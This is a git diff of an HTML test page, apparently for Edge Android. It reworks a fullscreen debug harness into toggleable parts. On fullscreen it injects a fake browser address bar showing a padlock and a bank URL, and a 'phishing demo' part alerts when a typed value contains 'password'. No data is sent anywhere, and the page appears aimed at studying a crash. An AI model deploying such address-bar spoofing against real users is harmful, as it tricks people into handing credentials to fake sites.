@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Fullscreen Debug Mode</title>
+  <title>Fullscreen Part-by-Part Test</title>
 
   <meta http-equiv="Permissions-Policy" content="notifications=()">
   <meta http-equiv="Feature-Policy" content="notifications 'none'">
@@ -34,212 +34,226 @@
       border: none;
       border-radius: 12px;
       cursor: pointer;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
     }
-    button:active { background: #0052cc; }
 
-    #debugPanel {
+    #status {
       position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      background: rgba(0, 0, 0, 0.9);
-      color: #00ff00;
-      padding: 10px;
-      font-family: monospace;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #333;
+      color: white;
+      padding: 8px 16px;
+      border-radius: 8px;
       font-size: 11px;
-      max-height: 300px;
-      overflow-y: auto;
-      z-index: 99999;
-      white-space: pre-wrap;
-      word-break: break-all;
+      font-family: monospace;
+      max-width: 90%;
+      text-align: center;
     }
 
-    .log-entry {
-      border-bottom: 1px solid #333;
-      padding: 4px 0;
+    #testInfo {
+      position: fixed;
+      top: 10px;
+      left: 10px;
+      background: rgba(0,0,0,0.8);
+      color: lime;
+      padding: 10px;
+      font-size: 10px;
+      font-family: monospace;
+      border-radius: 4px;
+      max-width: 200px;
     }
-
-    .log-error { color: #ff4444; }
-    .log-warn { color: #ffaa00; }
-    .log-info { color: #00aaff; }
-    .log-success { color: #00ff00; }
   </style>
 </head>
 <body>
 
-  <div id="debugPanel">
-    <div class="log-success">DEBUG MODE ACTIVE - Edge Android</div>
-    <div class="log-info">Window: <span id="winInfo"></span></div>
-    <div class="log-info">Screen: <span id="screenInfo"></span></div>
-    <hr style="border-color:#333">
+  <div id="testInfo">
+    ACTIVE PARTS:<br>
+    <span id="activeList"></span>
   </div>
 
   <button id="fsBtn">Enter Fullscreen</button>
+  <div id="status">Ready - Check active parts above</div>
 
   <script>
-    const debugPanel = document.getElementById('debugPanel');
-    const winInfo = document.getElementById('winInfo');
-    const screenInfo = document.getElementById('screenInfo');
-    let logCount = 0;
-
-    // Debug logger
-    function log(message, type = 'info') {
-      const entry = document.createElement('div');
-      entry.className = `log-entry log-${type}`;
-      entry.textContent = `[${++logCount}] ${new Date().toLocaleTimeString()}: ${message}`;
-      debugPanel.appendChild(entry);
-      debugPanel.scrollTop = debugPanel.scrollHeight;
-      console.log(`[DEBUG ${type}]`, message);
-    }
-
-    // Monitor dimensions
-    function updateDimensions() {
-      winInfo.textContent = `${window.innerWidth}x${window.innerHeight} | outer:${window.outerWidth}x${window.outerHeight}`;
-      screenInfo.textContent = `${screen.width}x${screen.height} | avail:${screen.availWidth}x${screen.availHeight}`;
-    }
-
-    updateDimensions();
-    setInterval(updateDimensions, 500);
-
     const btn = document.getElementById('fsBtn');
-    const originalHeight = window.outerHeight;
+    const status = document.getElementById('status');
+    const activeList = document.getElementById('activeList');
     
-    log(`Initial outerHeight: ${originalHeight}`, 'info');
+    let activeParts = [];
 
-    // Track fullscreen button click
+    // ============================================
+    // PART 0: BASE (JANGAN DI-COMMENT - WAJIB ADA)
+    // ============================================
+    let originalHeight = window.outerHeight;
+    
+    function updateActiveParts(partName) {
+      activeParts.push(partName);
+      activeList.innerHTML = activeParts.join('<br>');
+    }
+
+    updateActiveParts('BASE');
+
+
+    // ============================================
+    // PART 1: TIMING DELAY (requestAnimationFrame + setTimeout)
+    // UNTUK TEST: Comment block ini untuk hapus delay
+    // ============================================
+    let USE_TIMING_DELAY = true;
+    
+    if (USE_TIMING_DELAY) {
+      updateActiveParts('TIMING_DELAY');
+    }
+
+
+    // ============================================
+    // PART 2: HEIGHT DETECTION
+    // UNTUK TEST: Comment block ini untuk disable height monitoring
+    // ============================================
+    let USE_HEIGHT_DETECTION = true;
+    
+    if (USE_HEIGHT_DETECTION) {
+      updateActiveParts('HEIGHT_DETECT');
+    }
+
+
+    // ============================================
+    // PART 3: FAKE SEARCH BAR INJECTION
+    // UNTUK TEST: Comment block ini untuk disable fake bar
+    // SUSPECT UTAMA CRASH!
+    // ============================================
+    let USE_FAKE_SEARCHBAR = true;
+    
+    if (USE_FAKE_SEARCHBAR) {
+      updateActiveParts('FAKE_SEARCHBAR');
+    }
+
+
+    // ============================================
+    // PART 4: INPUT MONITORING (phishing demo)
+    // UNTUK TEST: Comment block ini untuk disable input tracking
+    // ============================================
+    let USE_INPUT_MONITORING = true;
+    
+    if (USE_INPUT_MONITORING) {
+      updateActiveParts('INPUT_MONITOR');
+    }
+
+
+    // ============================================
+    // PART 5: MUTATION OBSERVER
+    // UNTUK TEST: Comment block ini untuk disable DOM monitoring
+    // ============================================
+    let USE_MUTATION_OBSERVER = true;
+    
+    if (USE_MUTATION_OBSERVER) {
+      updateActiveParts('MUTATION_OBS');
+    }
+
+
+    // ============================================
+    // MAIN FULLSCREEN LOGIC
+    // ============================================
     btn.addEventListener('click', () => {
-      log('Button clicked - starting fullscreen sequence', 'warn');
-      
-      requestAnimationFrame(() => {
-        setTimeout(() => {
-          const elem = document.documentElement;
-          log('Attempting requestFullscreen()', 'warn');
+      status.textContent = "Entering fullscreen...";
 
-          try {
-            let fsPromise;
-            
-            if (elem.requestFullscreen) {
-              log('Using standard requestFullscreen', 'info');
-              fsPromise = elem.requestFullscreen();
-            } else if (elem.webkitRequestFullscreen) {
-              log('Using webkitRequestFullscreen (Safari)', 'info');
-              fsPromise = elem.webkitRequestFullscreen();
-            } else if (elem.msRequestFullscreen) {
-              log('Using msRequestFullscreen (IE11)', 'info');
-              fsPromise = elem.msRequestFullscreen();
-            } else {
-              log('No fullscreen API available!', 'error');
-              return;
-            }
+      function triggerFullscreen() {
+        const elem = document.documentElement;
 
-            if (fsPromise) {
-              fsPromise
-                .then(() => log('Fullscreen promise resolved', 'success'))
-                .catch(err => log(`Fullscreen error: ${err.message}`, 'error'));
-            }
-          } catch (err) {
-            log(`Exception during fullscreen: ${err.message}`, 'error');
-          }
-        }, 200);
-      });
+        if (elem.requestFullscreen) {
+          elem.requestFullscreen();
+        } else if (elem.webkitRequestFullscreen) {
+          elem.webkitRequestFullscreen();
+        } else if (elem.msRequestFullscreen) {
+          elem.msRequestFullscreen();
+        }
+
+        status.textContent = "Fullscreen triggered";
+      }
+
+      // PART 1 EXECUTION: Timing delay
+      if (USE_TIMING_DELAY) {
+        requestAnimationFrame(() => {
+          setTimeout(() => {
+            triggerFullscreen();
+          }, 200);
+        });
+      } else {
+        // Direct trigger tanpa delay
+        triggerFullscreen();
+      }
     });
 
-    // Monitor fullscreen changes
+
+    // ============================================
+    // FULLSCREEN CHANGE HANDLER
+    // ============================================
     document.addEventListener('fullscreenchange', () => {
       if (document.fullscreenElement) {
-        log('✓ ENTERED FULLSCREEN', 'success');
-        log(`FullscreenElement: ${document.fullscreenElement.tagName}`, 'info');
+        status.textContent = "Fullscreen active";
         btn.style.display = 'none';
-        
-        const newHeight = window.outerHeight;
-        const heightDiff = newHeight - originalHeight;
-        log(`Height change: ${heightDiff}px (${originalHeight} → ${newHeight})`, heightDiff > 50 ? 'warn' : 'info');
-        
-        if (heightDiff > 50) {
-          log('⚠ ADDRESS BAR HIDDEN - Height increased significantly', 'warn');
-        }
-      } else {
-        log('✗ EXITED FULLSCREEN', 'error');
-        btn.style.display = 'block';
-        
-        setTimeout(() => {
-          const postExitHeight = window.outerHeight;
-          log(`Post-exit height: ${postExitHeight} (original: ${originalHeight})`, 'info');
-          
-          if (Math.abs(postExitHeight - originalHeight) > 10) {
-            log('⚠ HEIGHT MISMATCH AFTER EXIT - Possible crash trigger!', 'error');
-          }
-        }, 100);
-      }
-    });
 
-    document.addEventListener('fullscreenerror', (e) => {
-      log(`Fullscreen ERROR event: ${JSON.stringify(e)}`, 'error');
-    });
-
-    // Monitor resize events
-    window.addEventListener('resize', () => {
-      log(`Resize: ${window.innerWidth}x${window.innerHeight}`, 'info');
-    });
-
-    // Monitor orientation changes
-    window.addEventListener('orientationchange', () => {
-      log(`Orientation: ${screen.orientation?.type || window.orientation}`, 'warn');
-    });
-
-    // Detect fake search bar injection point
-    let fakeBarInjected = false;
-    document.addEventListener('fullscreenchange', () => {
-      if (document.fullscreenElement && window.outerHeight > originalHeight + 50) {
-        if (!fakeBarInjected) {
-          log('🚨 INJECTING FAKE SEARCH BAR - This may cause crash on exit!', 'error');
-          fakeBarInjected = true;
+        // PART 2 EXECUTION: Height detection
+        if (USE_HEIGHT_DETECTION) {
+          const newHeight = window.outerHeight;
+          const heightDiff = newHeight - originalHeight;
           
-          const fakeBar = document.createElement('div');
-          fakeBar.id = 'fakeSearchBar';
-          fakeBar.style.cssText = 'position:fixed;top:0;left:0;right:0;height:56px;background:#f0f0f0;border-bottom:1px solid #ccc;z-index:9998;padding:8px;display:flex;align-items:center;';
-          fakeBar.innerHTML = '<span style="color:green">🔒</span> https://secure.example-bank.com/ <input type="text" placeholder="Search..." style="flex:1;margin-left:10px;border:none;background:transparent;">';
-          document.body.appendChild(fakeBar);
+          console.log(`Height: ${originalHeight} → ${newHeight} (diff: ${heightDiff})`);
           
-          log('Fake bar element added to DOM', 'warn');
-          
-          // Monitor for removal
-          const observer = new MutationObserver(() => {
-            if (!document.getElementById('fakeSearchBar')) {
-              log('❌ Fake bar removed from DOM', 'error');
+          // PART 3 EXECUTION: Fake search bar injection
+          if (USE_FAKE_SEARCHBAR && heightDiff > 50) {
+            console.log('🚨 INJECTING FAKE SEARCH BAR');
+            
+            const fakeBar = document.createElement('div');
+            fakeBar.id = 'fakeSearchBar';
+            fakeBar.style.cssText = 'position:fixed;top:0;left:0;right:0;height:56px;background:#f0f0f0;border-bottom:1px solid #ccc;z-index:9999;padding:8px;display:flex;align-items:center;';
+            fakeBar.innerHTML = '<span style="color:green">🔒</span> https://secure.example-bank.com/ <input type="text" placeholder="Search..." style="flex:1;margin-left:10px;border:none;background:transparent;">';
+            document.body.appendChild(fakeBar);
+            
+            status.textContent = "Fake bar injected";
+
+            // PART 4 EXECUTION: Input monitoring
+            if (USE_INPUT_MONITORING) {
+              fakeBar.querySelector('input').addEventListener('blur', (e) => {
+                if (e.target.value.includes('password')) {
+                  alert('Demo: Credentials captured!');
+                }
+              });
             }
-          });
-          observer.observe(document.body, { childList: true });
+
+            // PART 5 EXECUTION: Mutation observer
+            if (USE_MUTATION_OBSERVER) {
+              const observer = new MutationObserver(() => {
+                if (!document.getElementById('fakeSearchBar')) {
+                  console.log('❌ Fake bar removed from DOM');
+                }
+              });
+              observer.observe(document.body, { childList: true });
+            }
+          }
         }
-      } else if (!document.fullscreenElement && fakeBarInjected) {
-        log('Attempting to remove fake bar on exit', 'warn');
-        const fakeBar = document.getElementById('fakeSearchBar');
-        if (fakeBar) {
-          fakeBar.remove();
-          log('Fake bar removed successfully', 'success');
+
+      } else {
+        // EXIT FULLSCREEN
+        status.textContent = "Exited - checking crash...";
+        btn.style.display = 'block';
+
+        // PART 3 CLEANUP: Remove fake bar
+        if (USE_FAKE_SEARCHBAR) {
+          const fakeBar = document.getElementById('fakeSearchBar');
+          if (fakeBar) {
+            console.log('Removing fake bar on exit');
+            fakeBar.remove();
+          }
         }
-        fakeBarInjected = false;
+
+        setTimeout(() => {
+          status.textContent = "Exit OK - no crash detected";
+        }, 500);
       }
     });
 
-    // Monitor visibility changes
-    document.addEventListener('visibilitychange', () => {
-      log(`Visibility: ${document.visibilityState}`, 'info');
-    });
-
-    log('All event listeners registered', 'success');
   </script>
-
-  <link rel="manifest" href="data:application/manifest+json,{
-    %22name%22:%22Fullscreen Debug%22,
-    %22short_name%22:%22FSDebug%22,
-    %22start_url%22:%22.%22,
-    %22display%22:%22fullscreen%22,
-    %22background_color%22:%22%23000000%22,
-    %22theme_color%22:%22%230066ff%22,
-    %22icons%22:[{%22src%22:%22https://via.placeholder.com/192x192/0066ff/ffffff?text=D%22,%22sizes%22:%22192x192%22,%22type%22:%22image/png%22}]
-  }">
 
 </body>
 </html>
